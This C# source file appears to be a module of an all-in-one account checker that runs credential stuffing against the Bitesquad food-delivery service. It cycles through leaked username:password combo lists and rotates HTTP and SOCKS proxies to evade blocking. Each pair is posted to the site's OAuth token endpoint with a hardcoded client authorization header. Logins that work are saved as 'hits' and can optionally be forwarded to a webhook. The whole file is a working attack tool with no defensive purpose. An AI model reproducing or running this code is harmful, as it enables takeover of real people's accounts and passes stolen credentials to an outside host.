using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Bitesquadmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("User-Agent", "okhttp/3.8.1");
                            req.AddHeader("Authorization",
                                "Basic Ml8zbnpiY2prN3p4dXNrdzA4OG9vMG9rd284NDQ0Y3c4MDhrbzhzb3NrMDhvc2c0OG9vZzpvOTllNTh6aHJkd3djMDBzY2t3NGs0OG9rczAwNDBzazA4Y3cwd3NvZ29jNHMwNGM0");
                            req.SslCertificateValidatorCallback += (obj, cert, ssl, error) =>
                                (cert as X509Certificate2).Verify();
                            var str1 = "username=" + array[0] + "&password=" + array[1] +
                                       "&grant_type=password&device_id=d9c8ad68-0453-4e56-94db-06fb95bfc5b8";
                            var str2 = req.Post("https://www.bitesquad.com/oauth/v2/token", str1,
                                "application/x-www-form-urlencoded").ToString();
                            if (!str2.Contains("{\"message\":\"Invalid email/password combination\"}") &&
                                !str2.Contains("Invalid email/password combination") &&
                                !str2.Contains("Invalid email/password"))
                            {
                                if (str2.Contains("access_token"))
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Bitesquad_hits", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Bitesquad", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Bitesquad Hits");
                                }
                            }
                            else
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                                Program.Combos.Add(text);
                                req.Dispose();
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}